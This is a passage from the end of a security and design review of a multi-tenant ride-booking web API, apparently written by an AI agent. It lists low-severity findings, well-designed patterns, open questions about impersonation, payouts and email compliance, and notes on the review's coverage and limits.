| **Low** | `Services/Notifications/NotificationKinds.cs` — **the `cancel_request` notification kind emitted from `MeController:321` is NOT in the `Emailable` catalog** | A rider asking to cancel triggers `EmitToTenantAdmins(tenantId, "cancel_request", ...)` (`MeController.cs:321`). The kind `cancel_request` isn't listed in `NotificationKinds.Emailable`, so it's an in-app-only notification. The catalog UI (`NotificationController.GetCatalog`) won't show it as an opt-out option. The admin always gets the in-app notification. That's probably fine, but the inconsistency means the preferences page is silently incomplete. | Either add `cancel_request` to the catalog as `tenant_admin` audience, or document that some notification kinds are "always on" and add a column / convention to distinguish. |
| **Low** | `webapi/Controllers/NewsletterController.cs:36-58` (`Subscribe`) — **no `SubscribeRequest` schema visible in this read; relies on `Email` being a non-empty string** | The DTO probably has `[Required] [EmailAddress]` already; I didn't read it (file outside scope). If the validator IS present this is a no-op. If it isn't, see the High finding above about list-bombing. | Confirm `[EmailAddress]` is on `SubscribeRequest.Email`. If missing, add it. |
| **Low** | `webapi/Controllers/EventSubscriptionController.cs:109-130` (`Mine`) — re-flag from Section 1 | Already in Section 1 (`IsResolved` short-circuit missing). No change. | Per Section 1. |

## Patterns worth replicating

- **`HttpContextAuditLogger`** — the interface is clean, the impl reads
  actor + role + email + IP from `HttpContext`, and the per-call signature
  (`action, summary, targetKind, targetId, tenantId, metadata`) is the right
  shape. The system isn't using it widely, but the foundation is correct;
  filling in the call sites is the work, not redesigning the API.
- **`NotificationKinds.ForRole`** — single source of truth for what kinds are
  emailable for which audience. Adding a new kind is a one-line change.
  Replicate this pattern for any future "feature-flag-the-audience" surface.
- **`MonthlyPayoutDrafter`** — small, idempotent, swallows per-tenant exceptions
  so one bad tenant doesn't block the batch. The shape ("foreach tenant, do X,
  log per-tenant errors, return a Summary record") is the right scaffolding for
  every other background sweeper this codebase needs to grow.
- **`EmailCampaign.status` state machine** — `draft → sending → sent`, with
  edit/delete gated to `draft`. The send rows are denormalized
  (`email` + `name`) so audit survives subscriber deletion. The schema is right;
  the implementation just needs the SMTP wiring + chunking + unsubscribe.
- **`TenantController.UploadBrandingImage`** — `[RequestSizeLimit(MaxUploadBytes)]`
  + content-type allowlist + extension lookup + delete-old-on-replace. This is
  the right shape for every file upload in the codebase; other controllers
  (e.g. survey photo uploads) should mirror it.
- **`EventSubscriptionRepository.Upsert`** — `ON CONFLICT (tenant_id,
  LOWER(email)) DO UPDATE` with `unsubscribed_at = NULL` is the clean way to
  re-subscribe without losing history. Same for `NewsletterRepository.UpsertFromSignup`.
- **`SuperAdminController.Bootstrap`** — `AnySuperAdminExists` short-circuit
  makes it a one-shot. Section 1 already called this out as the canonical
  one-shot pattern; reaffirming.

## Open questions

1. **Should impersonation be expanded into "view-only" and "act-as"?** A
   super-admin onboarding call usually needs "see what they see" (view-only),
   not "make changes as them." A two-mode impersonation flow + auditing both
   makes the "support staff helping a confused admin" case safe and clears the
   path to disallow money moves under impersonation.
2. **Where does the campaign sender live?** The user's memory note says
   RidePass chunks at 30 for Gmail's BCC cap, and LoamPass/RidePass use the same
   pattern. RidePass should adopt it. Decision needed: SMTP relay (current
   stub), SES (cheapest at volume), Postmark (best deliverability for
   transactional), or a hybrid (Postmark for transactional, SES for marketing).
   The choice affects the suppression-list shape and the unsubscribe-header
   format.
3. **Is "tenant_admin can delete a subscriber" the right shape?** Today the
   `DELETE /api/Newsletter/Admin/Subscribers/{id}` hard-deletes the row. If the
   subscriber later wants to verify "I unsubscribed; don't email me again," the
   row is gone and a re-import treats them as a new opt-in. CAN-SPAM expects a
   suppression record per address even after delete. Suggest: soft-delete only;
   add a separate "purge after 1 year inactive" worker.
4. **Two-person rule for `SendPayoutViaStripe` — yes or no?** Stated as a High
   above; the user should decide between (a) a per-amount cap requiring a second
   super admin to approve, (b) a 2FA step-up on every dispatch, or (c) accepting
   the risk on the assumption that super-admin tokens are tightly held. The
   answer affects the JWT-revocation roadmap.
5. **Daily-status auto-expiry default.** 12 hours? 24? End-of-day in tenant
   timezone? The right answer is probably "end of the operating day per
   `tenant.hours_json`" which is a coupling we don't yet have. A 24-hour default
   with an explicit `clear at` picker is the cheapest first cut.
6. **Should `tenant_admin` see the audit log?** Today `GET /api/SuperAdmin/AuditLog`
   is super-admin-only. A tenant_admin can't see who refunded what or who
   changed the service charge at their own tenant. Either expose a
   tenant-filtered subset via a `Tenant/AuditLog` endpoint, or accept that
   audit is for the platform team only and document that contract.
7. **Notification preferences vs in-app delivery.** `notification_preference`
   only controls `email_enabled`. There's no opt-out for the in-app row itself.
   That's probably the right choice (in-app is free and useful), but it should
   be documented so a tenant admin asking "why is my inbox cluttered with payout
   notifications?" understands the answer is "those don't have an opt-out."
8. **Stripe Connect destination change as a separate flow.** Today
   `StartStripeConnectOnboarding` will reuse the existing account if one is on
   file. If a tenant sells, the new owner needs to *change* the destination —
   currently they'd have to call `DisconnectStripe` first, then onboard fresh.
   That works but leaves a window where the row has no Connect account. A
   dedicated "change Connect destination" flow + audit-log + super-admin
   notification would be safer.

## Coverage notes

- I read every file in scope. The `SuperAdminController` and `CampaignController`
  in particular were read end-to-end with attention to control-flow gaps
  (audit-log presence on each write path) rather than just SQL tenant-scoping.
- I did **not** re-read every repository called by these controllers — I traced
  the shape (does `Upsert`/`Insert`/`Update` take a `tenantId` and use it in the
  predicate?) for the relevant Newsletter/Campaign/Notification/AuditLog
  methods. All the writes I checked are properly tenant-scoped (audit_log
  carries a nullable `tenant_id` and the writers pass it correctly).
- The actual SMTP delivery for campaigns is not implemented — the controller
  warns about this explicitly. All campaign-send-related findings are
  pre-emptive ("here's what to fix before that wiring lands"); none describe
  current behavior leaking email.
- `Services/Helpers/TwilioSmsSender.cs` was referenced from
  `EventSubscriptionController` but not in scope; I confirmed only that
  `NormalizeE164` is the entry point and assumed it does what it claims.
- The frontend admin views (`Admin/Settings/*`, `Admin/Campaigns.vue`,
  `Admin/Subscribers.vue`, `SuperAdmin/*`) were read with attention to (a)
  unsafe `v-html` and (b) where the API surface was being called from. I did
  not run `vue-tsc --noEmit` to confirm none of these changes introduce build
  errors because no code changes were applied.
- Cross-section: the Stripe Connect onboarding flow returns the link in the
  JSON response — that's correct shape for a SPA, but I haven't re-traced the
  webhook handler that flips `stripe_connect_status` on `account.updated`
  (Section 2's territory).
